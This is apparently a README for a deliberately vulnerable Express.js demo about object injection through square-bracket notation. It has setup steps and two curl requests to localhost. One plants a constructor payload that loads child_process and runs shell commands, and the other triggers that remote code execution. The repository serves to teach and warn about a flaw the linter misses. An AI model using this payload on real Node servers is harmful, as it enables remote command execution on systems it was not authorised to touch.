# Express-object-injection

A prototype to demonstrate the dangers of square bracket notation using object injection attack. It is inspired by this [article](https://github.com/nodesecurity/eslint-plugin-security/blob/master/docs/the-dangers-of-square-bracket-notation.md) from ESLint Security. This article was originally written by Jon Lamendola for [^Lift Security](https://web.archive.org/web/20150430062816/https://blog.liftsecurity.io/2015/01/15/the-dangers-of-square-bracket-notation).

## Step 0

* Install nodejs

* clone repository

```console
$ git clone https://github.com/0xdbe/express-object-injection.git
$ cd express-object-injection
```

* Install express

```console
$ npm install
```
* Start application

```console
$ node index.js
```

## Step 1

* Setting a malicious fuction as constructor

```console
$ curl http://localhost:3000/api/user \
    -H 'Content-Type: application/json' \
    --data '["constructor", "var require = global.require || global.process.mainModule.constructor._load;require(\"child_process\").exec(arguments[0], console.log)"]'
```

* Call the malicious function allowing a remote code execute (RCE)

```console
$ curl http://localhost:3000/api/user \
  -H 'Content-Type: application/json' \
  --data '["anyVal", "date"]'
```

note: this vulnerable function is not detected by ESLint Security !!
